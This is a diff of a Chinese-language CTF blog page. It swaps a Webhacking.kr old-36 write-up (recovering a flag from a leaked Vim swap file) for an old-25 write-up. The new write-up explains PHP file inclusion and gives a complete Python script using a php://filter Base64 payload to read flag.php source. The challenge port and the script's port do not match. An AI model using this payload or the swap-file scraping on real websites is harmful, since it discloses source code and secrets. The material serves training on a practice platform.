   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-36/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-25/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1339,7 +1339,7 @@ admin；<code>LIKE</code> 在这里承担比较作用，避开被过滤的
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-36/" class="post-title-link" itemprop="url">Webhacking.kr old-36</a>
+          <a href="/wp/webhacking/old-25/" class="post-title-link" itemprop="url">Webhacking.kr old-25</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1369,7 +1369,7 @@ admin；<code>LIKE</code> 在这里承担比较作用，避开被过滤的
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>216</span>
+      <span>280</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -1389,21 +1389,24 @@ admin；<code>LIKE</code> 在这里承担比较作用，避开被过滤的
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>Recover source and flag data from a Vim swap file.</p>
-<p>从 Vim swap 文件中恢复源码和 flag。</p>
+<p>Read the flag source through the file parameter.</p>
+<p>通过 file 参数读取 flag 源码。</p>
 </blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-8/</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://webhacking.kr:10001/</span><br></pre></td></tr></table></figure>
 <h3 id="analysis">Analysis</h3>
-<p>题目目录残留 <code>.index.php.swp</code>。Vim swap
-文件虽然包含二进制元数据，但编辑中的 PHP
-文本仍以可搜索字符串保存在响应中。下载响应后，按 <code>FLAG{</code>
-开头、<code>}</code> 结尾的字节模式提取 flag 即可恢复题目数据。</p>
+<p><code>file</code> 参数进入 PHP 的文件包含路径，服务端会在资源名后补上
+<code>.php</code>。直接包含 <code>flag</code> 会执行其中的
+PHP；把路径改成
+<code>php://filter/convert.base64-encode/resource=flag</code> 后，PHP
+先读取 <code>flag.php</code>，再将源码编码为
+Base64，源码内容不会被执行。</p>
 <h3 id="solution">Solution</h3>
-<p>目标文件为：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/bonus-8/.index.php.swp</span><br></pre></td></tr></table></figure>
-<p>下面的完整脚本下载 swap 文件，并从字节内容中提取 flag：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://webhacking.kr/challenge/bonus-8/.index.php.swp&quot;</span></span><br><span class="line">FLAG_PATTERN = re.<span class="built_in">compile</span>(<span class="string">rb&quot;FLAG\&#123;[^&#125;\r\n]+\&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    response = requests.get(URL, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    matches = FLAG_PATTERN.findall(response.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> matches:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no flag-shaped text found in the Vim swap response&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(value.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>响应包含 Vim swap 内容；从中读取并恢复 flag 后填入认证表单。</p>
+<p>完整请求脚本如下。它从响应中提取 Base64
+字符串并尝试解码，直到找到包含 PHP flag 变量的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://webhacking.kr:10017/&quot;</span></span><br><span class="line">FILTER_PATH = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_source</span>(<span class="params">response_text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    candidates = re.findall(<span class="string">r&quot;[A-Za-z0-9+/]&#123;20,&#125;=&#123;0,2&#125;&quot;</span>, response_text)</span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> candidates:</span><br><span class="line">        padded = token + <span class="string">&quot;=&quot;</span> * (-<span class="built_in">len</span>(token) % <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = base64.b64decode(padded, validate=<span class="literal">True</span>).decode(</span><br><span class="line">                <span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> (ValueError, UnicodeError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$flag&quot;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&quot;FLAG&#123;&quot;</span> <span class="keyword">in</span> decoded:</span><br><span class="line">            <span class="keyword">return</span> decoded</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;response did not contain decodable flag source&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    response = requests.get(</span><br><span class="line">        URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;file&quot;</span>: FILTER_PATH&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(decode_source(response.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>从响应中读取并解码 <code>flag.php</code> 源码后，将其中的 flag
+填入认证表单。</p>
+<p>服务端响应模板变化时，应先从响应中定位实际 Base64 内容。</p>
 
       
     </div>
